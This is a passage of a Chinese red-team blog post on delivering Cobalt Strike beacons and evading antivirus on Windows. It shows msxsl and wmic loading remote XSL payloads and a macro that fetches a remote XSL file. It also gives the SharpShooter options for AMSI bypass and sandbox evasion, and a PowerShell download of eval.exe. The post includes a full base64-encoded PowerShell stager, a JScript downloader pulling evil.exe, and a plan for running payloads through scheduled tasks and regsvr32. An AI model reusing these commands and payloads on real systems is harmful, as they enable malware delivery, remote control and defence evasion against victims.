+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msxsl.exe http<span style="color:#960050;background-color:#1e0010">:</span>//xxx.xxx.xxx.x/foo.xsl http<span style="color:#960050;background-color:#1e0010">:</span>//xxx.xxx.xxx.x/foo.xsl
+</span></span></code></pre></div><p>此时利用的截图如下，可以看到成功上线</p>
+<p><img src="../img/21.png" alt=""></p>
+<hr>
+<ol start="2">
+<li>通过wmic调用</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>wmic <span style="color:#66d9ef">process</span> get name /format<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;http://xxx.xxx.xxx.x/foo.xsl&#34;</span>
+</span></span></code></pre></div><p>理论上可以成功利用，但是我利用的时候wmic停止运行，问题暂未解决</p>
+<p>在确定了该XSL能成功上线以后，我们通过宏也可实现远程加载，其中sharpshooter生成的宏代码如下：</p>
+<pre tabindex="0"><code class="language-vbscript" data-lang="vbscript">Sub Auto_Open()
+	Set XML = CreateObject(&#34;Microsoft.XMLDOM&#34;)
+	XML.async = False
+	Set xsl = XML
+	xsl.Load &#34;http://192.168.233.129/foo.xsl&#34;
+	XML.transformNode xsl
+End Sub
+</code></pre><p>加载了宏之后word进程崩溃，但是CS是可以成功上线的，一但Word进程被结束即掉线，因此使用该种方式还需要借助进程迁移技术保证CS不掉线。</p>
+<p>来具体分析一下代码，在代码中我们可以看到对参数的说明</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>, formatter_class<span style="color:#f92672">=</span>argparse<span style="color:#f92672">.</span>RawTextHelpFormatter)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--stageless&#34;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_true&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Create a stageless payload&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--dotnetver&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;ver&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dotnetver&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Target .NET Version: 2 or 4&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--com&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;com&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;comtechnique&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;COM Staging Technique: outlook, shellbrowserwin, wmi, wscript, xslremote&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--awl&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;awl&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;awltechnique&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Application Whitelist Bypass Technique: wmic, regsvr32&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--awlurl&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;awlurl&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;awlurl&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;URL to retrieve XSL/SCT payload&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--payload&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;format&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;payload&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Payload type: hta, js, jse, vbe, vbs, wsf, macro, slk&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--sandbox&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;types&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sandbox&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Anti-sandbox techniques: &#34;</span> <span style="color:#f92672">+</span> antisandbox)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--amsi&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;amsi&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amsi&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Use amsi bypass technique: amsienable&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--delivery&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;type&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;delivery&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Delivery method: web, dns, both&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--rawscfile&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;path&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rawscfile&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Path to raw shellcode file for stageless payloads&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--shellcode&#34;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_true&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Use built in shellcode execution&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--scfile&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;path&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;shellcode_file&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Path to shellcode file as CSharp byte array&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--refs&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;refs&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refs&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;References required to compile custom CSharp,</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">e.g. mscorlib.dll,System.Windows.Forms.dll&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--namespace&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;ns&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;namespace&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Namespace for custom CSharp,</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">e.g. Foo.bar&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--entrypoint&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;ep&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;entrypoint&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Method to execute,</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">e.g. Main&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--web&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;web&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;web&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;URI for web delivery&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--dns&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;dns&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dns&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Domain for DNS delivery&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--output&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;output&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;output&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Name of output file (e.g. maldoc)&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--smuggle&#34;</span>, action<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;store_true&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Smuggle file inside HTML&#34;</span>)
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--template&#34;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;tpl&gt;&#34;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;template&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Name of template file (e.g. mcafee)&#34;</span>)
+</span></span></code></pre></div><p>可以看到其中的一些参数，例如</p>
+<h3 id="计划任务调用">计划任务调用</h3>
+<p>先介绍一些前置知识。</p>
+<h4 id="schtasks">schtasks</h4>
+<p>安排命令和程序，使其定期运行或在指定时间运行。向计划中添加任务和从中删除任务、根据需要启动和停止任务以及显示和更改计划的任务。
+在进行schtasks 这个计划任务命令的参数详解之前，先简要提出以下几点：</p>
+<p>SchTasks.exe 执行的操作类似于“控制面板”中“计划任务”中的操作。可以使用两种工具中的任一种来创建、删除、配置或显示计划任务。</p>
+<p>键入不带任何参数的 schtasks 可以查询当前系统中所有计划任务。</p>
+<h4 id="mshta">mshta</h4>
+<p>mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。</p>
+<h4 id="执行方式">执行方式</h4>
+<h5 id="mshta-1">mshta</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mshta <span style="color:#e6db74">&#34;about:&lt;script language=vbs&gt; CreateObject(&#34;</span>Wscript.Shell<span style="color:#e6db74">&#34;).Run(&#34;</span>calc.exe<span style="color:#e6db74">&#34;,0,true)(window.close)&lt;/script&gt;&#34;</span>
+</span></span></code></pre></div><p><img src="../img/12.png" alt=""></p>
+<h5 id="powershell">powershell</h5>
+<p>下载可通过</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(<span style="color:#e6db74">&#39;xxx.xx.xx.xx/eval.exe&#39;</span>,<span style="color:#e6db74">&#39;C:\eval.exe&#39;</span>)
+</span></span></code></pre></div><p>上线可通过CS生成的ps1文件或者直接生成ps代码的payload进行，示例代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMADEAWABlADIALwBhAFMAQgBEAC8ATwAzAHcASwBxADQAcABrAFcAMABkADQAQgBKAEkAbQBsAFMASgAxAGcAUgBoAHcAZwBSAEQATQBLACsARQBRAFcAcgB4AHIAcwAyAEgAdABwAGYAYQBhAFIAeAAvAGYALwBjAGIARwB0AFAAUwBTADkAbABKAFYATwBrAHMAVwA2ADkAMgBaADIAWgBuAGYAUABMAEcAbwBQAEwATgBrAHcARwB6AFoARgBvAFEAcQBaADAATQBhAGgARQB6ADQAeQBuAGsAbQBjADEAbwBUAFQAYQBuAGMASwBPAC8AVgBqAEIAUAA1AHQAbwB5ADMANAA4AFgATQBwAFgASwAyAEMAbwBRADkAdwA0AFEARQBOAEEAeQBWAHoANQBtAFQATABnADYAdwBwADIAaQBuAGEAeAB6AE0AUABFAEUAaQBUAHIATgBLADgAaABFAFQAVQBoAEkARgBWAEQAOAA1AHkAWgB3AGsAVwA1AEUAZgBZAG8AZgBPAGYAQwB6AFoAbQBzADQAOABLAGgAZQBDAGgASABDAFIATgBrAEcAcgBWAFUAMQA0AG0AUABuAFQAZAArACsAcQBVAFIAQgBRAFgAKwA2AC8AYwAzAFUAcQBVAFIAaABTAGIAOAA0AFoARABUAFYAZAArAGEASwBNAEYAagBTAGcAWgAzAGYAegBKADIAcABMADUAYgBOAHkATwBzAHYAVgB1AFoAaABqAG4AcABMAHQAcQB0AGgAZQBnAEUASABJAEoALwBGAFoAUwA5AGcANAB0AGkAQgBuAHIAVABpAFQAbQB2AHIAMwAzADYAbwArAE8AUwB0AE8AYwA3AGMAZgBJADgAeABEAFQAYgBWADIAbwBhAFIAZQBqAG4AQwB1ADYAcwBwAFgAUABiADYAdwB2ADEAdABSAFQAVwAwAHoATwB4AEMAaABjAEcAUgB1AHgAUAB6AFMAZQBXADYAUQBhAE4AOQBKAGwARwAvAHYAZABWAGYAMQBEAE4AZwBXAFUAQgBrAEYAdgB2AEoAegBFADIATwBaAGUAdwA1AE4AaABXAFUAWABrAEUARgA3AEIARgBVADkAMQAvAFQAWABZAGsAbQAxAFUAegAvAGkAUABLAHUAOAAxAHkAYQBwAFEAcgAzAEkAbAA4AHkAagBjAEMANQBwAEkARgBZAFcARABkAGIATQBwAG0ARwB1AGcAWAAzAEMAYQBZADgANgBVADYAMQBEAE4AdwBjAGMAWABzAHUAawBIAFQATQBCAFYAVgBjAEcAZQBqAFoAMQAzADIAdAAwAGIAeQBjAHUAMwBvAHQAVAA5AGUAZgBhAEgAOABXAEIARABzACsAegBXAE4AQQB6AFgAegBNAHYAUgBCAFcAaABuAEwAcABZADAAcABrAEUANgBJAC8AQwBLAG4ATgB5AE0AawBtAFcARgBPAHoAUgB1AGkASgBrAEMAZAArAE4AVQBzAGcAcQBiAFYAQQBDAFMAeABIAHMANABQAE8AMABIADAAUgBVAG4AeQBxAFQAMgBIAFcAVAA2AFQAUwA5ADkAcwBBAFoAWgBuADgAcQBxAEgAagBnAFMAbgBuADIAegB0AHoAcgBjAGEATgBNAGgAbwBLAFIAYQBlAFkAawA4AFgATgB5AEgAaAAvAE0ANQBoAEgAagBoAEEAWQB4AHcAYwA4AGoAdAAwAFkAZAA1AHQAUABhAHoAcwBjAGUAcwB3AC8AQgBxAGIAMwBrAE4ATwBwAHcAbQBnAEMAUwBPADUAQgAxAFEARgBGAE4AVABRADgAbwBxAGEAWAB3AHEARABHAGkAawArAGQAcwB0AHgANgBUADMAMwBnAHIAZQArAFcAUQBEAFkANABQAFEAUwB1AEkAQwBmADEASABaAGYAWgBPADEATgBTAG0AMwA2AFkAZQBBAEwAagAvAFYAcwBGAFoARABxAFEARQBQAFYAQwBuAGEAYgBBADcAMwBCADUALwBBADUARgBhADUAVABnAE0AcwAwAG8AMwBnAHAAeQAwAHMANABwAEYATQBhAGMAawBxAHkAQQAvAFoATwBrAFIAaQBxAFIASQBsAHUAcAAzAGQAZABzAFIAbAA4AHoARwBvAFQAeQBJAG0AKwBvAHYAUQBKAHAAZQBYAFIAVgArAEsASQBQAEkAQgB2AGMAQwBEAEgAMQByAFIAVwAyAEcAZQBZAHgASwBWAG0AawB3AFEAaQBzADcAaQA3AGsASABGAGQAUQBYAE0AYQBsAGkAegBwAG4AdgBnAHEAUQAxACsAQQBSADIAWQBpAHcAcwBHAFEAZABOAFEATABMAC8ARABoAEEAOQBaADEASABaADkARgBhAGMAZQBrAEMAZABWAEEAeQBEAFkAeABmAHEAUQA1AHAAUwBTAGIAeABoAGwAeABMADEARgAyAG8AZgBFAG0AVwBmAEYAVABGAFcAQgA1AEMATwBsAEkAWQBBAHMATABpAFEAVwBXAFgASQBBAGcAawAxAFMATQAwACsAaQA3AHcALwBWAE8ALwBIAGsAdgBTAEQAbgB0AFcAQQBwAHAANwBVAGsAbABTAGMAVgBIAFkAeQBUAHAAaQBFADAAbwA0ADcAdwBjADAAMwBNAEIAUABvAEEAZwBtAHcARwBZAEgAdwBLAGoAaQBrAGwAKwBXADQAWgBmAGkAdQA5AGkAWgAvAHgAMAB3AEUAegAwAFAAVAA1ADIAMQBpAEwAbABtAHgAdQBZAEcAMwBEAGUAKwBBAGwAWgBxAGkAOQBwAFoAOABNAEoAOABhACsAYgBaAGQARABiAHQAMQA0AHcAcQB4AGoAYgB1AHgAcgB6AHIASQBkAHQAaQBWAFkAWQA2AEIANwBwADQAVgBtAGwAZQBJAFYARgB2ADMARABXAFoAcwBHAHIAMABQAGkARgBSAGcAegAzADEAZwBSAGQAZABGAHAAUAB2AFUAdgBmAFYAYQBuAFcAWgBZAEsAYQBaAHkAOQB2AHgAMgB1AGQAdwBZAEYAMQBDAHAAVgBMADQAcgBGAFoAYQBFAG0AagBIADkARQBwAEcATwB4AHoAYgBiAEYAcQB5AGgAdAB0ADYAMQBLAHMAQgBYAGEAUABKAGIAcwA5AHEAYgBqADgANgBOAHgAeABGAHYANQBNAHYARwB3AGgAbQBKADAATABvAHMAUAB4AEoAYwB2ACsAQQBFAFYAUQBRADUANQB4AEUAZQA5AGsAUwAvAFkAWAB1AFYAZgBIADUANAAyAFkAeQB0AHEAbgBUAG0AcABkAFYAcQBYAHQAOAB1AFcAcAA4AEcAVQBiAHUASwB4AE0AUAA1AHQAYgBUAHIAUgBnAEcAUAB6AFAAQwB4AEgANwByADkAWQBjAGYAcwBXAGUAaQBpADkAWQBUAGUATgBnADIAeQBtAG4AdQA5AE4AUwBtADEAMwBUADYALwBkAHoAdQBzAHYATAAzAGIAVgBRAGEAMgB4ADUAZQBQAG8ANAB0AEMASQBxAE0AVwB1AHYAZgBMAGEANwBQAFgAWAA3ADcAdABEAFQAdgBHAFkATABkAEUASQAyAFAAeAA4AEsAYwB2AE0AcABiAGIAZgBKAEcATQBoADAAWABTAHcANwBYAFYAaQBHAEkAbgBYADYAVAB5AFkAdgBTAHAAWQBRADYARwB4AGsAZABVAE4ASAByAFkAMgBQAFQAQQBwAHYANgBnAHYAaABpAHoAeAAzAHcAOQBmAHoAMABPAEgAdgBoAHkAVwArAEMAbQBRAE0AaAAwAEYANABaAHAARABiAGgAaABEAGUAcABQAHcAZABBAHEAdgA4ADEAZgBqADgAdwB0AFkARAA1AE0ANQBEADYASwAxAHYAMwBEAEEAdwBWAHMARgBuAGEAbAAwAEsAcwAxADgAZwB2AG4AcwBWAEIAcAArAGgAZQBYAEcAeQA0ACsAaABtAE0AMgBkAHYASgBEAFoAaAB1AGkAWgB4AG0AMABEAGUAdQAyAGMAegAzAEcATAB1AGsATgBlAFUAWABJAG8AdQBOAFcAZwBYAGUAOQBRAFcAcwBBADkAbQBKAGIAcwBxADYAQQBKAGoAQwBvAE4AQwA5AE4AUAA1AC8AUABYADYAMwA3ADQANgBFADUAdQBFAGMASQBkADYAdABGAHcAZQBmADUANABtAGkARgBNAEUASwB3AFUAdwBIADkASwBnAGcAWgBSAEkAdwArADkAUABvAFgASQBIAHQAWgA3AFAAUQBaAEoAVwBNADQAZAAyAE8AYgBoAHAANABMAHkAZQBRAHoAMABCAGwAaQBxAE4AOQBoAEcANwB1AHkASwBZADgAUgBvAGMATwBIAHoAVgA5AHUAQwBTADcASQB0AC8AdgAyAHIAdgBWADAAZQB3ADUAdgAvAEwAdQA3AHUAMABjADMAYgB5AEIATgBUAGoASgBKADEATQA4AGoAeAA5AG4AWAA4AHYAOQBvAG8AbQAwAGMAaABBAHYATQBJAFIAKwBnAEUAUgA2AHEAbQBDAEUAQwBJADIAMQBuAFgAYwBGAGkARABrADEANwBlAFYAaABhADAAcwBDAG4ASABBAFkASgBHAEQAVQBPAHUAWQA4ADQARgAzAGIAYwBnAEgALwBTAEMAVwBFAGMAMgBEAGYAcABLAGQAUwA0AEEAUwB4AEwANQB5ACsAdQBkAE8AVQBiAG8AZgA2ADkASwB4ACsAMgAzAHIAMQA3AEIARQBQAFMAbwBoAEkAbgBlAGEANQBGAGYAVgBjAHUAcwBvAFYAdABxAFYAQwBBAFYAbAByAFkAbABnAHQANgA1AHYAWAAyAFYAOABWAHEAcAAzADIAVABsAG8AMgA3ADgAUgBHAFUAeAB4AGYAeAA1AEMASQA5AHMANABkADYASQBSAGQAUQBmADgAagAvAGoASABWAGEAOAA1AEsAcgBmAHgALwByADcAMwB1AC8ATwBIADAAVgAvAG8AWABzAE0AVQBqAFAARABuAC8AYwArAEIAMQAzAC8ARABsAEUASQA4AHcAawBzAEYAcABRADIAegBuAGQAVAB5AGUAdgBSAFMAbwBOAHcASwBOAFoAOABNAGoAVABFAEcARgBPACsAcwBTAGoAKwAxADAAawB6AHoAbwB3AEsAVwBiAFUAOQA1AGwATQAwADEARwBPAEUAQQByAFoASgB4AGoAYQA2AFUAZgBsAFMAbwAvAG4AdgAxAEQAaQBRAEoANAA5AGkAVABsAE0AKwBFAGsAYgAxAEUANgB4AHIAagBSAHYAeAA4AG8AcABWAHIANABxAFoAdwBBAEsAQwBrAHYAbgBNAE8AWQBIAGIAaABUADMAUgBHAFgALwByACsAVwBMAHMAZwBGAFQARQBzAFkAdgBTAG8ALwBhAEYARQBiAFoATQAxAFAATQBvAGQAZABSAEcARwAxAGkAMABZAG0AUQBtAEIAagAyAC8AZwBHADYAdQB3AGcAVQBCAGcAMABBAEEAQQA9AD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=
+</span></span></code></pre></div><p>同样也可以配合其他方式上线，但是比较容易被杀&hellip;</p>
+<h5 id="js">js</h5>
+<p>js解释器通常已经内置并且不易被杀软拦截，可用于恶意文件下载</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">WinHttpReq</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;WinHTttp.WinHttpRequest.5.1&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WinHttpReq</span>.<span style="color:#a6e22e">Open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#a6e22e">Wscript</span>.<span style="color:#a6e22e">Arguments</span>(<span style="color:#ae81ff">0</span>),<span style="color:#75715e">/*async=*/</span><span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WinHttpReq</span>.<span style="color:#a6e22e">Send</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Wscript</span>.<span style="color:#a6e22e">Echo</span>(<span style="color:#a6e22e">WinHttpReq</span>.<span style="color:#a6e22e">ResponseText</span>);
+</span></span></code></pre></div><p>下载时调用cscript进行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cscript /nologo download.js http<span style="color:#960050;background-color:#1e0010">:</span>//xxx.xxx.xx.x/evil.exe
+</span></span></code></pre></div><h4 id="实现过程">实现过程</h4>
+<p>之前讲了不少其他的一些下载和上线常见的方式，接下来具体讲通过schtask绕过杀软的过程，主要是在宏中利用计划任务schtasks白进程启动reg来绕过杀软执行命令。</p>
+<p>根据微软官方的文档，可以用下述方法实现VB开发时间触发器</p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/taskschd/time-trigger-example--scripting-?redirectedfrom=MSDN">https://docs.microsoft.com/zh-cn/windows/win32/taskschd/time-trigger-example--scripting-?redirectedfrom=MSDN</a></p>
+<p>开发思路主要有以下几点：</p>
+<p>1.创建TaskService对象，并设置计划任务不可见，且无视电源情况</p>
+<p>2.创建时间触发器判断UAC，避免触发</p>
+<p>3.设置触发器的起始时间和结束时间</p>
+<p>4.设置指定任务运行的频率以及任务启动后重复模式的重复时间</p>
+<p>5.调用执行恶意代码</p>
+<p>6.用当前用户直接创建任务</p>
+<p>具体代码可以参考[1]文章地址</p>
+<p>此处调用是通过调用regsvr32远程下载实现，通过宏的方式来启动reg可以有效绕过大部分杀软，比直接通过PS等执行更为隐蔽，现在的杀软通常都已将PS列入了监控名单。</p>
+<h2 id="参考资料">参考资料</h2>
+<p>[1] <a href="https://www.zhihuifly.com/t/topic/1241">https://www.zhihuifly.com/t/topic/1241</a></p>
+<p>[2] <a href="https://cloud.tencent.com/developer/article/1474011">https://cloud.tencent.com/developer/article/1474011</a></p>
+<p>[3] <a href="https://www.dbappsecurity.com.cn/show-145-551-1.html">https://www.dbappsecurity.com.cn/show-145-551-1.html</a></p>
+<p>[4] 《安恒信息渗透攻击红队百科全书》</p>
+<p>[5] <a href="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/">https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/</a></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
